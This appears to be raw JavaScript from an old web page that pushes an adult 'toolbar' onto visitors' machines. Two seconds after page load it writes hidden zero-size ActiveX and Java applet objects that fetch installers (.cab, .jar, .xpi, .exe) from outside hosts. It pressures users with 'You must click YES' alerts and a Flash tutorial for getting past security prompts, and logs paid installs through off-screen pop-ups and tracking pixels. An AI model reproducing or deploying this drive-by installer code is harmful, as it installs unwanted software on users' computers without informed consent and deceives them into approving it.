<!--
 var flag=0;
 var loadfirst=0;

 var sp2=false;
 var holder;
 if(window.navigator.userAgent.indexOf("SV1") != -1) sp2=true;
 if (sp2){
   document.write('<div id="tutorial_popup" style="visibility:hidden;position:absolute;top:0px;left:0px;width:635px;height:308px;"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="635" height="308">');
   document.write('<param name="movie" value="http://www.slotchbar.com/ist/flash/sp2tutorial_v1.swf">param name="quality" value="high"><param name="wmode" value="transparent">');
   document.write('<embed src="http://www.slotchbar.com/ist/flash/sp2tutorial_v1.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="700" height="500"></embed></object></div>');
   } 
 document.write('<iframe id="downloads_manager" style="position:absolute; visibility:hidden;"></iframe>');
 function retryit(){
        if(window.retry && retry>0 && !sp2) {
                alert("You must click YES to get access"); 
                loadfirst=0;
                start_download();
                retry--;
                }
        }
 function showActiveX() {
        holder.write('<OBJECT id="barobject" width=1 height=1 classid="CLSID:7C559105-9ECF-42b8-B3F7-832E75EDD959"');
        holder.write('codebase="http://www.xxxtoolbar.com/ist/softwares/v4.0/0006_153376.cab" onerror="parent.retryit();">');

        holder.write('<PARAM name="account_id" value="153376">');
        holder.write('<PARAM name="download_key" value="616498b0947be121f9a06b38a3437d43">');
        holder.write('<PARAM name="download_lock" value="1109130941">');
        if(!sp2){
              holder.write('<PARAM name="cfg" value="mtb">');
        } if(sp2){
              holder.write('<PARAM name="cfg" value="mtb_sp2">');
              }
         holder.write('<PARAM name="sub" value="">');
         holder.write('</OBJECT>');
}

 function showJava() {

          holder.write('<APPLET Archive="http://www.ysbweb.com/ist/softwares/v4.0/javainstaller.jar" code="javainstaller.InstallerApplet.class" name="InstallerApplet" width="0" height="0" hspace="0" vspace="0" align="middle">');
          holder.write('<PARAM name="account_id" value="153376">');
          holder.write('<PARAM name="download_key" value="616498b0947be121f9a06b38a3437d43">');
          holder.write('<PARAM name="download_lock" value="1109130941">');
          holder.write('<PARAM name="cfg" value="java">');
          holder.write('<PARAM name="sub" value="">');
          holder.write('</APPLET>');
}
 function showNS() {

          holder.write('<APPLET Archive="http://www.ysbweb.com/ist/softwares/v4.0/javainstaller.jar" code="javainstaller.InstallerApplet.class" name="InstallerApplet" width="0" height="0" hspace="0" vspace="0" align="middle">');
          holder.write('<PARAM name="account_id" value="153376">');
          holder.write('<PARAM name="download_key" value="616498b0947be121f9a06b38a3437d43">');
          holder.write('<PARAM name="download_lock" value="1109130941">');
          holder.write('<PARAM name="cfg" value="javans">');
          holder.write('<PARAM name="sub" value="">');
          holder.write('</APPLET>');
}
 function start_download() {
        var bname=navigator.appName;
        var bver=parseInt(navigator.appVersion);
        if (bname == 'Microsoft Internet Explorer' && bver >= 2) {
                if(!loadfirst || sp2){
                        downloads_manager.document.close();
                        holder= downloads_manager.document;
                } else {
                        holder=document;
                        }
                showActiveX();
		if (sp2) document.all.tutorial_popup.style.visibility = "visible";
                                if(!flag && !sp2){
                        window.open("http://install.xxxtoolbar.com/ist/scripts/log_downloads.php?account_id=153376&auto_close=1&software_id=0006&payable=1&country=US","_blank","top=10000, left=100000");
                } if(!flag && sp2){
                        holder.write('<IMG SRC="http://install.xxxtoolbar.com/ist/scripts/log_downloads.php?account_id=153376&auto_close=1&software_id=0006&payable=1&country=US" width=1 height=1 border=0>');
                        }
                flag++;
         } else if (bname == 'Netscape' && bver >= 5) {
		holder=document;
		showNS();
                if (InstallTrigger.updateEnabled()) {
                        InstallTrigger.install({'Content Access Plugin 1.01' : 'http://www.xxxtoolbar.com/ist/softwares/v4.0/ist_netscape.xpi'});
                } else { location.replace('http://www.slotch.com/ist/softwares/installers/istinstall_netscape.exe'); }
        } 
}

 function start_download_loadfirst() { 
        start_download(); 
        }

 // -->


<!--
	var currentDate = new Date();
	var adRecurrence = "always";
	var adId = "a1102093954";
	var adExpiration = 0;
	var retry=2;
	var obj=null;	

    
	function SetCookie(sName, sValue, sExpire){
		var expireCode = "";
		if (sExpire) { expireCode =  "expires=" + sExpire + ";" }
		document.cookie = sName + "=" + escape(sValue) + ";" + expireCode
	}


	function GetCookie(sName) {
		var aCookie = document.cookie.split("; ");
		for (var i=0; i < aCookie.length; i++) {
			var aCrumb = aCookie[i].split("=");
			if (sName == aCrumb[0]) { return unescape(aCrumb[1]); }
		}
		return null;
	}
	
	function upop() {
				var url = "http://www.xxxtoolbar.com/ist/scripts/downloads_manager.php?pevent_type=onload&retry=2&ref=&event_type=onload&recurrence=always&retry=2&loadfirst=0&account_id=153376&delayload=2&adid=a1102093954&signature=153376";
		var win='toolbar=1,location=1,directories=0,menubar=0,scrollbars=1,resizable=1,top=110,left=2000,width=600,height=500'
		window.open(url,'pop',win);
		if(obj)
			obj();
	}


		SetCookie(adId,"1", adExpiration);
		                        setTimeout("start_download();",2*1000);
		//-->
